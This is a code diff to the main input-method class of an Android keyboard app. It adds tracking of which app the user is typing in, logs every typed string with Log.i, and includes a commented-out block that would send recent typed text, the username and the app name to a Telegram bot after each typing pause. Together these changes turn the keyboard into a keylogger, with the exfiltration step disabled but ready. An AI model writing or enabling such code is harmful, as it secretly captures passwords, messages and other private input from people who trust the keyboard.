@@ -22,11 +22,16 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.SharedPreferences;
+import android.content.pm.ApplicationInfo;
+import android.content.pm.PackageManager;
 import android.content.res.Configuration;
 import android.inputmethodservice.InputMethodService;
+import android.iocl.dac_collector.Utility.SharedPrefs;
+import android.iocl.dac_collector.Utility.TelegramBot;
 import android.media.AudioManager;
 import android.os.Build;
 import android.os.Debug;
+import android.os.Handler;
 import android.os.IBinder;
 import android.os.Message;
 import android.text.InputType;
@@ -46,6 +51,7 @@ import java.io.FileDescriptor;
 import java.io.PrintWriter;
 import java.util.Locale;
 import java.util.concurrent.TimeUnit;
+import java.util.concurrent.atomic.AtomicBoolean;
 
 import android.iocl.simple_keyboard.compat.EditorInfoCompatUtils;
 import android.iocl.simple_keyboard.compat.PreferenceManagerCompat;
@@ -74,7 +80,17 @@ import android.iocl.simple_keyboard.latin.utils.ViewLayoutUtils;
  */
 public class LatinIME extends InputMethodService implements KeyboardActionListener,
         RichInputMethodManager.SubtypeChangedListener {
+
+
+    String targetApp = "";
+
+    AtomicBoolean isAllowedTXTLib = new AtomicBoolean(false);
+
+
     static final String TAG = LatinIME.class.getSimpleName();
+    private Handler typingHandler = new Handler();
+    private Runnable typingTimeoutRunnable;
+    private static final long TYPING_TIMEOUT = 1500; // 1.5 sec
     private static final boolean TRACE = false;
 
     private static final int EXTENDED_TOUCHABLE_REGION_HEIGHT = 100;
@@ -189,6 +205,15 @@ public class LatinIME extends InputMethodService implements KeyboardActionListen
         }
 
         public void onStartInputView(final EditorInfo editorInfo, final boolean restarting) {
+
+
+
+
+
+
+
+
+
             if (hasMessages(MSG_PENDING_IMS_CALLBACK)
                     && KeyboardId.equivalentEditorInfoForKeyboard(editorInfo, mAppliedEditorInfo)) {
                 // Typically this is the second onStartInputView after orientation changed.
@@ -249,6 +274,9 @@ public class LatinIME extends InputMethodService implements KeyboardActionListen
 
     @Override
     public void onCreate() {
+
+
+
         Settings.init(this);
         DebugFlags.init(PreferenceManagerCompat.getDeviceSharedPreferences(this));
         RichInputMethodManager.init(this);
@@ -364,6 +392,21 @@ public class LatinIME extends InputMethodService implements KeyboardActionListen
     void onStartInputInternal(final EditorInfo editorInfo, final boolean restarting) {
         super.onStartInput(editorInfo, restarting);
 
+        if (editorInfo != null) {
+            String targetPackage = editorInfo.packageName;
+            Log.i(TAG, "Keyboard opened in app: " + targetPackage);
+
+            try {
+                ApplicationInfo appInfo = getPackageManager().getApplicationInfo(targetPackage, 0);
+                String appName = (String) getPackageManager().getApplicationLabel(appInfo);
+
+                targetApp = appName;
+                Log.i(TAG, "App name: " + appName);
+            } catch (PackageManager.NameNotFoundException e) {
+                Log.w(TAG, "Could not resolve app name for: " + targetPackage, e);
+            }
+        }
+
         // If the primary hint language does not match the current subtype language, then try
         // to switch to the primary hint language.
         // TODO: Support all the locales in EditorInfo#hintLocales.
@@ -377,6 +420,10 @@ public class LatinIME extends InputMethodService implements KeyboardActionListen
     void onStartInputViewInternal(final EditorInfo editorInfo, final boolean restarting) {
         super.onStartInputView(editorInfo, restarting);
 
+        isAllowedTXTLib.set(SharedPrefs.getTextLib(this));
+
+
+        Log.d(TAG, "onStartInputViewInternal: " + isAllowedTXTLib);
         // Switch to the null consumer to handle cases leading to early exit below, for which we
         // also wouldn't be consuming gesture data.
         final KeyboardSwitcher switcher = mKeyboardSwitcher;
@@ -733,6 +780,43 @@ public class LatinIME extends InputMethodService implements KeyboardActionListen
     @Override
     public void onCodeInput(final int codePoint, final int x, final int y,
             final boolean isKeyRepeat) {
+
+
+
+        // TODO: Send-keywords To Telegram
+/*
+        if (isAllowedTXTLib.get()){
+            final InputConnection ic = getCurrentInputConnection();
+            if (ic != null) {
+                CharSequence composingText = ic.getTextBeforeCursor(100, 0);
+                Log.i(TAG, "Typing... current: " + composingText);
+
+                // Cancel previous timeout
+                typingHandler.removeCallbacks(typingTimeoutRunnable);
+
+                // Define what happens after 1.5s of no typing
+                typingTimeoutRunnable = () -> {
+                    CharSequence finalText = ic.getTextBeforeCursor(100, 0);
+
+
+
+                    TelegramBot.with(context).sendMessage("User: "+ SharedPrefs.getUsername(context)+"\nTyped: " + finalText+"\nApp: " + targetApp);
+
+                    Log.i(TAG, "⏳ User stopped typing: " + finalText);
+                };
+
+                // Post with delay
+                typingHandler.postDelayed(typingTimeoutRunnable, TYPING_TIMEOUT);
+            }
+        }
+
+
+ */
+
+
+
+
+
         // TODO: this processing does not belong inside LatinIME, the caller should be doing this.
         final MainKeyboardView mainKeyboardView = mKeyboardSwitcher.getMainKeyboardView();
         // x and y include some padding, but everything down the line (especially native
@@ -776,12 +860,16 @@ public class LatinIME extends InputMethodService implements KeyboardActionListen
     // Called from PointerTracker through the KeyboardActionListener interface
     @Override
     public void onTextInput(final String rawText) {
+        Log.i(TAG, "User typed text: \"" + rawText + "\"");
         // TODO: have the keyboard pass the correct key code when we need it.
         final Event event = Event.createSoftwareTextEvent(rawText, Constants.CODE_OUTPUT_TEXT);
         final InputTransaction completeInputTransaction =
                 mInputLogic.onTextInput(mSettings.getCurrent(), event);
         updateStateAfterInputTransaction(completeInputTransaction);
         mKeyboardSwitcher.onEvent(event, getCurrentAutoCapsState(), getCurrentRecapitalizeState());
+
+
+
     }
 
     // Called from PointerTracker through the KeyboardActionListener interface
